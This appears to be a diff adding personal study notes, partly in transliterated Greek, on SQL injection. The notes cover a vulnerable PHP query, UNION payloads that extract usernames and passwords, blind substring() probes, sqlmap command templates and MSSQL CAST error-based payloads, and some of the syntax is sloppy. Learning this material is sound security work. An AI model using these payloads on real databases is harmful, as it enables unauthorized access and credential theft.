@@ -1,0 +1,77 @@
+## SQL INJECTION 
+
+ena querie moiazei kapos etsi 
+
+* SELECT name, description FROM products WHERE id=1;
+* SELECT <columns list> FROM <table> WHERE <condition>;
+* UNION SELECT <columns list> FROM <table> WHERE <condition>;
+* SELECT * FROM users WHERE username='" .$_GET["username"] . "'");
+
+
+
+## Injection querie looks like
+
+* SELECT name, description FROM products WHERE id='1' UNION SELECT User,Pass FROM Account; 
+
+
+
+## Exploitation of the querie
+
+* SELECT name, description FROM products WHERE id='1 ' or '1'='1' --+ ||' UNION SELECT User,Pass FROM Account; 
+
+* SELECT name, description FROM products WHERE id='1' UNION SELECT User,Pass FROM Account WHERE 
+'1'='1';
+
+
+
+## PAYLOAD 
+
+* SELECT name, description FROM products WHERE id='1 ' or '1'='1 --+
+* SELECT name, description FROM products WHERE id='1 ' or '1'='2 --+
+
+
+
+## QUERIES
+
+* user()
+* substring()  || ex. select substring('elearn', 2, 1);    == l (e l earn)
+* substring(user(), 1, 1);
+
+$ use thoose to exploit ex
+ or substring(user() , 1, 1)= 'a' --+
+ or substring(user() , 1, 1)= 'b' --+
+ or substring(user() , 2, 1)= 'a' --+
+ UNION SELECT user(); --+
+ or db_name(0)=0 --+
+==============================================
+
+## SQLMAP 
+
+sqlmap -u 'url' -p 'parameter' --technique= ?
+sqlmap -u 'url' --data='user=a&pass=a' -p 'parameter' 
+
+
+
+## OTHER TECHNIQUES { TOP CAST } 
+
+ or 1 in (SELECT TOP 1 CAST ('fildname' as varchar(4096)) from 'tablename' WHERE xtype='U')--+
+
+ or 1 in (SELECT TOP 1 CAST ('fildname' as varchar(4096)) from 'tablename' WHERE 'fieladname'  AND NOT IN('list','list2'))--+
+
+ or 1 in (SELECT TOP 1 CAST (version() as varchar(4096)))--+
+
+  or 1 in (SELECT TOP 1 CAST (DB_NAME(0) as varchar(4096)))--+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
